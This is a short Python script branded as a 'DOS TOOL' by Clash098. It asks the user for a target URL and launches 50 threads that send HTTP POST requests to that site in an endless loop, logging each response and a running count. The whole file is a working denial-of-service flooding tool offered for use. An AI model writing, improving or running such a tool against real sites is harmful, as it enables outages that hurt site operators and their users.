from colorama import Fore
import requests
import threading
print(Fore.BLUE + '██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     ')
print('██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ')
print('██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     ')
print('██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     ')
print('██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗')
print('╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ by Clash098')
print ('')
print ('                   Options - By Clash098')
print ('                     |  Options  |')
print ('                     |(1)  Start |') 
print ('                     |(2)  Quit  |')                                                          
print ('')
#Variables
count = 0
#Start or quit
option = input(Fore.BLUE + 'Option❱❱  ')
#URL to spam
url = input(Fore.BLUE + 'URL❱❱  ')
#Request data to post
data = {
    'NAME': 'DATA',
}

#Code for request send
def do_request():
    global count
    while True:
        response = requests.post(url, data=data).text
        count += 1
        print (Fore.BLUE + "[LOG]  " + Fore.RED + response + " REQUEST: " + Fore.BLUE + str(count))

Threads = []
if option == "1":
    for i in range(50):
        t = threading.Thread(target=do_request)
        t.daemon = True
        Threads.append(t)

    for i in range(50):
        Threads[i].start()

    for i in range(50):
        Threads[i].join()
elif option == '2':
    quit